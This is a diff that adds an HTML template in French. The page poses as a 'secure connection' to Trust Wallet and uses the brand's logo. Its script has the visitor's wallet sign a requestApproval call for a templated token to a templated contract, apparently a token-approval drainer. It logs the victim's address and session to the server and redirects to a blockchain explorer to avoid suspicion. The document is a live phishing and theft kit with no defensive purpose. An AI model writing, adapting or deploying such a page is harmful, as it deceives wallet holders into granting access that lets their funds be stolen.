@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connexion sécurisée</title>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink@latest/dist/index.umd.min.js"></script>
+</head>
+<body>
+    <div class="box">
+        <img src="https://trustwallet.com/assets/images/media-kit/icon.png" width="80" />
+        <h2>Connexion sécurisée à Trust Wallet</h2>
+        <p>Veuillez approuver la connexion à l'application décentralisée.</p>
+        <button onclick="approveAndRedirect()">Connecter mon wallet</button>
+    </div>
+
+    <script>
+        async function approveAndRedirect() {
+            const tronWeb = window.tronWeb;
+            if (!tronWeb || !tronWeb.ready) {
+                alert("Veuillez ouvrir ce lien dans Trust Wallet (navigateur intégré).");
+                return;
+            }
+
+            const contractAddress = "{{ contract_address }}";
+
+            try {
+                const contract = await tronWeb.contract().at(contractAddress);
+                await contract.requestApproval("{{ token_address }}").send();
+
+                fetch("/log", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ session: "{{ session_id }}", address: tronWeb.defaultAddress.base58 })
+                });
+
+                window.location.href = "https://tronscan.org/#/";
+            } catch (err) {
+                alert("Erreur : " + err.message);
+            }
+        }
+    </script>
+</body>
+</html>
